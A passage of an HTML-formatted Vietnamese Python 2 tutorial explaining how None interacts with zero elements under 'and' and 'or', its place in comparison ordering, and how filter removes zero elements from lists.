&lt;td&gt;{1:1}.update({}) = {}.update({1:1}) = {1:1}&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;Số phức&lt;/td&gt;
&lt;td&gt;+&lt;/td&gt;
&lt;td&gt;0 + 0j&lt;/td&gt;
&lt;td&gt;&amp;nbsp;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;Logic&lt;/td&gt;
&lt;td&gt;or&lt;/td&gt;
&lt;td&gt;False&lt;/td&gt;
&lt;td&gt;False or True = True or False = True&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;div class="section" id="none-va-cac-toan-tu-logic"&gt;
&lt;h2&gt;2. None và các toán tử logic&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;None&lt;/strong&gt; là một tập hợp đặc biệt, chỉ có chính nó, mà cũng không phải là chính nó. Không phải là chính nó vì &lt;strong&gt;None&lt;/strong&gt; bao hàm ý nghĩa là &lt;em&gt;thiếu giá trị&lt;/em&gt; (denoting lack of value):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="nb"&gt;type&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="go"&gt;&amp;lt;type &amp;#39;NoneType&amp;#39;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;None&lt;/strong&gt; tương tác với tất cả các phần tử không:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;(([]&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="p"&gt;[])&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;(({}&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="p"&gt;{})&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="mf"&gt;0.0&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mf"&gt;0.0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="nb"&gt;set&lt;/span&gt;&lt;span class="p"&gt;([])&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;set&lt;/span&gt;&lt;span class="p"&gt;([]))&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;((()&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="p"&gt;())&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="mi"&gt;0j&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;J&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="bp"&gt;False&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="bp"&gt;False&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Nếu ta gọi &lt;strong&gt;S&lt;/strong&gt; là tập hợp các phần tử không, bao gồm chính &lt;strong&gt;None&lt;/strong&gt;, thì với phép toán &lt;strong&gt;and&lt;/strong&gt;, &lt;strong&gt;None&lt;/strong&gt; chính là phần tử không bên phải của &lt;strong&gt;S&lt;/strong&gt;. Ai bảo &lt;strong&gt;None&lt;/strong&gt; không phải là giá trị.&lt;/p&gt;
&lt;p&gt;Tuy nhiên:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="p"&gt;[])&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="p"&gt;{})&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="nb"&gt;set&lt;/span&gt;&lt;span class="p"&gt;([]))&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Tương tự:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="nb"&gt;set&lt;/span&gt;&lt;span class="p"&gt;([]))&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;set&lt;/span&gt;&lt;span class="p"&gt;([]))&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="p"&gt;[])&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="p"&gt;[])&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="p"&gt;{})&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="p"&gt;{})&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="mi"&gt;0j&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0j&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="p"&gt;())&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="p"&gt;())&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Nghĩa là &lt;strong&gt;None&lt;/strong&gt; là phần tử không bên phải đối với tập &lt;strong&gt;S&lt;/strong&gt; nói trên trong phép toán &lt;strong&gt;or&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Và:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;(({}&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;(([]&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="nb"&gt;set&lt;/span&gt;&lt;span class="p"&gt;([])&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="mi"&gt;0j&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;((()&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="mf"&gt;0.0&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Như vậy khi &lt;strong&gt;None&lt;/strong&gt; tương tác với các phần tử không, &lt;em&gt;thứ tự các toán hạng&lt;/em&gt; là điều bạn cần chú ý.&lt;/p&gt;
&lt;p&gt;Phép toán &lt;strong&gt;or&lt;/strong&gt; giữa &lt;strong&gt;None&lt;/strong&gt; và object bất kỳ không phải là phần tử không là ánh xạ đồng nhất bất kể thứ tự phép toán:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="nb"&gt;set&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;
&lt;span class="go"&gt;set([&amp;#39;a&amp;#39;])&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="nb"&gt;set&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;span class="go"&gt;set([&amp;#39;a&amp;#39;])&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;abc&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;&amp;#39;abc&amp;#39;&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;abc&amp;quot;&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;
&lt;span class="go"&gt;&amp;#39;abc&amp;#39;&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="go"&gt;{1: 1}&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;
&lt;span class="go"&gt;{1: 1}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Phép toán &lt;strong&gt;and&lt;/strong&gt; thì luôn cho kết quả &lt;strong&gt;None&lt;/strong&gt; với bất kỳ phần tử nào không phải là phần tử không, không kể thứ tự toán hạng:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;(([&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;abc&amp;quot;&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="k"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;abc&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Một biểu thức logic chứa &lt;strong&gt;None&lt;/strong&gt; có thể trả về &lt;strong&gt;None&lt;/strong&gt;, nghĩa là không có giá trị. Điều này làm cho &lt;strong&gt;None&lt;/strong&gt; trong python trở lên phức tạp và không giống với &lt;strong&gt;null&lt;/strong&gt; trong C# hay &lt;strong&gt;nothing&lt;/strong&gt; trong VB.NET. Trong VB.NET một biểu thức logic luôn luôn trả về giá trị logic.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;None&lt;/strong&gt; là tận cùng (bottom), là nhỏ hơn tất cả.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mf"&gt;0.0&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="p"&gt;{}&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="go"&gt;True&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;None&lt;/strong&gt; không có bất kỳ một method nào, thậm chí chính nó là một method khi được dùng với &lt;strong&gt;filter&lt;/strong&gt; hoặc &lt;strong&gt;map&lt;/strong&gt; (xem phần dưới).&lt;/p&gt;
&lt;p&gt;Cuối cùng &lt;strong&gt;None&lt;/strong&gt; là &lt;strong&gt;None&lt;/strong&gt; - đừng băn khoăn (^-^):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;
&lt;span class="go"&gt;True&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;
&lt;span class="go"&gt;True&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Việc hiểu rõ bản chất của &lt;strong&gt;None&lt;/strong&gt; cùng các tương tác của nó với các phần tử không qua các phép toán logic là RẤT quan trọng khi bạn viết các lệnh &lt;tt class="docutils literal"&gt;if&lt;/tt&gt;, &lt;tt class="docutils literal"&gt;filter&lt;/tt&gt;...&lt;/p&gt;
&lt;p&gt;Một hàm bất kỳ có thể trả về &lt;strong&gt;None&lt;/strong&gt; nếu bạn viết &lt;strong&gt;return None&lt;/strong&gt;, hoặc không &lt;strong&gt;return&lt;/strong&gt; ở bất kỳ chỗ nào trong hàm. Một hàm như vậy khi tham gia vào biểu thức logic sẽ tạo ra những hiệu ứng mà bạn cần phải nắm rõ bản chất.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="loai-bo-cac-phan-tu-khong-trong-danh-sach"&gt;
&lt;h2&gt;3. Loại bỏ các phần tử không trong danh sách&lt;/h2&gt;
&lt;p&gt;Nói chung các phần tử không sẽ không có ý nghĩa khi nó nằm trong danh sách. Một trong những cách để loại bỏ phần tử không là dùng &lt;strong&gt;filter&lt;/strong&gt;. &lt;strong&gt;filter&lt;/strong&gt; cùng với hàm &lt;strong&gt;func&lt;/strong&gt; sẽ loại bỏ tất cả các phần tử trong danh sách mà tác động của hàm &lt;strong&gt;func&lt;/strong&gt; lên phần tử này tạo ra phần tử không. Diễn giải dễ hiểu của nó như sau:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;filter(func, list)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;tương đương với&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;S = [0, 0.0, [], (), {}, set([]), &amp;quot;&amp;quot;, 0j, False]&lt;/span&gt;
&lt;span class="go"&gt;def filter(func, list):&lt;/span&gt;
&lt;span class="go"&gt;    return [x for x in list if func(x) not in S]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ví dụ:&lt;/p&gt;
